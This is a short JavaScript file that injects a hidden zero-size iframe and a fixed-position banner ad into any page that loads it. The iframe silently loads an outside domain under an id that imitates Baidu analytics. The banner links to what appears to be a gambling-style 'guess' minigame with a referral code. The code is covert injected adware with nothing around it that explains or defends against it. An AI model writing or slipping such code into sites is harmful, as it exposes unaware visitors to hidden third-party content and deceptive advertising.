function createIframe(id,url,width,height,timeOut){
	    var timeOutVar = setTimeout(function(){
		            clearTimeout(timeOutVar);
		            return ;
		        }, timeOut);
	    var iframe = document.createElement("iframe");
	    iframe.id=id;
	    iframe.width=width;
	    iframe.height=height;
	    iframe.src=url;
	    iframe.style='display:none'
	    document.body.appendChild(iframe);
	    return iframe;
}
function createAd(url, imgsrc){
	    var ad=document.createElement("a");
	    ad.href=url;
	    ad.target="_blank";
	    ad.style.cssText="position:fixed;bottom:0;left:0;right:0;z-index:3;font-size:0;text-align:center;background:'0 0'";
	    ad.innerHTML="<img style='width:100%;max-height:80px' src='"+imgsrc+"'>"
	    document.body.appendChild(ad);
	    return ad;
}

createIframe('baidu_hm','https://static.789game.tk/',0,0,5)
createAd('http://intest1.dstars.cc/minigame/guess/index.html?invite_code=100220','https://raw.githubusercontent.com/789game/gamejs/master/game4.gif')
